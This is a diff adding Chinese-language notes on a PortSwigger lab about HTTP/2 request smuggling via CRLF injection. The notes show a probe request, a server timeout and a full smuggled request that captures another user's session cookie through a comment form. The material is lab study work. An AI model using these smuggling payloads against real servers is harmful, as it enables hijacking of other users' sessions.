@@ -1519,6 +1519,68 @@ Content-Length: 0
 - 正常使用者訪問首頁，載入 `/resources/js/analyticsFetcher.js`
 - 實際上載入 https://exploit-0a1e006204e120469dd0338e01fd007e.exploit-server.net/resources/
 
+## Lab: HTTP/2 request smuggling via CRLF injection
+
+| Dimension | Description                                                                                                                   |
+| --------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/advanced#request-smuggling-via-crlf-injection                          |
+| Lab       | https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection |
+
+先嘗試 CRLF Injection
+
+```
+POST / HTTP/2
+Host: 0aca00060344104880643a39002a006a.web-security-academy.net
+Hello: world\r\nTransfer-Encoding: chunked
+
+
+```
+
+預期會收到 timeout
+
+```
+HTTP/2 500 Internal Server Error
+Content-Type: text/html; charset=utf-8
+Content-Length: 125
+
+<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
+```
+
+接下來就是跟 [## Lab: Exploiting HTTP request smuggling to capture other users' requests](#lab-exploiting-http-request-smuggling-to-capture-other-users-requests) 一樣的作法
+
+attack request
+
+```
+POST / HTTP/2
+Host: 0aca00060344104880643a39002a006a.web-security-academy.net
+Hello: world\r\nTransfer-Encoding: chunked
+Content-Length: 316
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0aca00060344104880643a39002a006a.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=njntbwAGoeOzQEl3l5C7kmds2TYv4oZr;
+Content-Length: 920
+
+csrf=ECSu5Ujtr8gPzpFEWZZKSpsCTunj6M5o&postId=1&name=victim4&email=victim4%40email.com&comment=
+```
+
+等待使用者 15 秒後訪問首頁，就會觸發留言，然後提取使用者的 session 即可通關～
+
+## H2.TE vulnerabilities
+
+https://portswigger.net/web-security/request-smuggling/advanced#h2-te-vulnerabilities
+
+<!-- todo-yus -->
+
+## Response queue poisoning
+
+https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning
+
+<!-- todo-yus -->
+
 ## 參考資料
 
 - https://portswigger.net/web-security/request-smuggling
